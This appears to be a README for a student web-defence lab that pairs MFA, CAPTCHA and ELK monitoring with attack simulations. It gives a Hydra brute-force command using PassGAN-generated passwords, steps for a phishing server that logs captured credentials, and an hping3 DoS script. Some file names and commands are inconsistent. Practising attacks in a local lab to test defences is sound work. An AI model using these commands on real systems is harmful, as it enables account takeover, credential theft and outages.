# 📁 Directory Overview

- `web_defense_project/`  
  Project folder for web, including MFA, CAPTCHA, and rate limiting.
  
- `elk/`  
  ELK stack configurations for logging, intrusion detection, and visualization using Elasticsearch, Logstash, and Kibana.
  
- `Bruteforce/`  
  A folder containing brute-force attack simulation scripts.

- `phingattack/`  
  A directory related to phishing attacks.

- `hping3_dos.sh`  
  Shell script for launching DoS attacks using `hping3`.

# 🛠️ How to Run

## Brute Force Attack(`Bruteforce/`)

Using Kali Linux to run the brute force attack:

### Step 1: Generate Passwords with PassGAN

Use the pre-trained PassGAN model to generate realistic password guesses:

```bash
python sample.py \
  --input-dir pretrained \
  --checkpoint pretrained/checkpoints/195000.ckpt \
  --output ai_pass_1k.txt \
  --num-samples 1000
```

### Step 2: Test Passwords Using Hydra 
```bash
hydra -l Group18 -P /home/kali/PassGAN/ai_pass.txt 127.0.0.1 http-post-form '/login:account=^USER^&password=^PASS^:Invalid Credentials!' -s 5000 -t 4
```

## Phishing Attack(`phingattack/`)

### Step 1: Start the Phishing Server

Run the following command in your terminal to launch the phishing server:

```bash
python phishing.py
```
The phishing server is built using Flask and listens on port 8888.

### Step 2: Visit the Phishing Page (Victim's Perspective)
Accessible at: http://localhost:8888

### Step 3: View Captured Credentials
After a victim submits credentials, they are saved to local log files. You can inspect the captured data using:
```bash
cat captured_logins.txt
cat captured_registrations.txt
```
##  DDoS Attack(`phingattack/`)
Using Kali Linux to run and monitor the DDoS attack:
### Step 1: Run Wireshark
Select eth0 interface and add the filter condition of ip.dst==destination address in the filter.
### Step 2: Run hping3_ddos.sh 
change the destination address to the ip address to be attacked.
```bash
hping3 hping3_dos.sh
```
